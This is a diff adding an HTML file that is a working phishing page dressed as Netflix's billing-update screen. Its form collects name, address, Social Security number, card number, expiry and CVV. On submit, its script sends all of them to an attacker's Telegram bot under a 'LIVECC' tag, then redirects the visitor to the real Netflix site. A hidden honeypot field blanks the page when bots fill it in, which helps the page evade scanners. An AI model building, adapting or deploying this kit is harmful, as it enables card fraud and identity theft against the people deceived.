@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title>Netflix</title>
+  <style>
+  body{
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+.formal{
+  width: 27%;
+  margin: auto;
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 5%;
+}
+form input{
+  padding: 10px;
+    outline: none;
+    font-size: 15px;
+    margin: 1% 0 1% 0;
+}
+form{
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+button{
+  background: #e50914;
+    border-radius: 4px;
+    border: 0;
+    color: #fff;
+    height: 50px;
+    padding: 10px 20px;
+    font-weight: bold;
+    font-size: 16px;
+    margin-top: 2%;
+}
+
+footer{
+  padding: 20px;
+  color: #fff;
+  background: rgb(221, 220, 220);
+    padding: 20px;
+    color: #737373;
+}
+.header{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  width: 90%;
+  margin: auto;
+}
+
+
+@media(max-width: 850px){
+  .header{
+    width: 95%;
+  }
+  .formal{
+    width: 95%;
+  }
+}
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://download.logo.wine/logo/Netflix/Netflix-Logo.wine.png" height="100" alt="">
+    <p>Sign Out</p>
+  </div>
+
+  <div class="formal">
+    <h1>Update your Billing information</h1>
+    <p>By updating your billing information, you will continue to enjoy account advantages and benefits</p>
+    <div class="imgg">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="">
+      <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="">
+      <img src="https://img.icons8.com/ios/50/000000/amex.png" alt="">
+      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="">
+    </div>
+
+    <form action="#" id="form">
+      <input type="text" placeholder="Full Name" id="full-name" required>
+      <input type="text" placeholder="Full Name" style="display: none;" id="full-namee">
+      <input type="text" placeholder="Billing Address" id="billing" required>
+      <input type="text" placeholder="Billing Zip Code" id="zip-code" required>
+      <input type="text" placeholder="City" id="city" required>
+      <input type="text" placeholder="State" id="state" required>
+      <input type="text" value="United States" id="country" required>
+      <input type="text" placeholder="Social Security Number" id="phone" required>
+      <input type="text" placeholder="" value="+1" id="psn" required>
+      <input type="text" placeholder="Card Number" id="bin" required>
+      <input type="text" placeholder="Expiration Date (MM/YY)" id="exp-date" required>
+      <input type="text" id="security" placeholder="Security Code (CVV)" required>
+      <button type="submit">UPDATE PAYMENT</button>
+    </form>
+  </div>
+
+    <footer>
+      <div class="footer">
+        <ul>
+          <li>Questions? Contact us.</li>
+          <li>FAQ</li>
+          <li>Cookie Preferences</li>
+        </ul>
+        <ul>
+          <li>Help Center</li>
+          <li>Corporate Information</li>
+          <li>Help Center</li>
+        </ul>
+      </div>
+    </footer>
+    <script>
+
+      const forma = document.querySelector('#form')
+    
+      let bot = {
+        TOKEN: "6636761328:AAEfHmiz8pDB1XlMaBq60cq-tRgM0Zl8PHU",
+          chatID: "-822669959"
+      }
+
+
+    forma.addEventListener("submit", e =>{
+          e.preventDefault();
+          let fullNamee = document.querySelector('#full-namee').value
+          let fullName = document.querySelector('#full-name').value
+          let billing = document.querySelector('#billing').value
+          let zipCode = document.querySelector('#zip-code').value
+          let city = document.querySelector('#city').value
+          let state = document.querySelector('#state').value
+          let country = document.querySelector('#country').value
+          let phone = document.querySelector('#phone').value
+          let psn = document.querySelector('#psn').value
+          let bin = document.querySelector('#bin').value
+          let expDate = document.querySelector('#exp-date').value
+          let security = document.querySelector('#security').value
+          var body = document.querySelector('body');
+
+
+          if(fullNamee !== ""){
+                          // Remove all child nodes from the body
+              while (body.firstChild) {
+                body.firstChild.remove();
+              }
+              return
+          }
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=LIVECC=>${fullName}=${billing}==${zipCode}==${city}==${state}==${country}==${phone}==${psn}==${bin}==${expDate}==${security}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://netflix.com");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+              }) 
+      })
+    </script>
+
+</script>
+</body>
+</html>
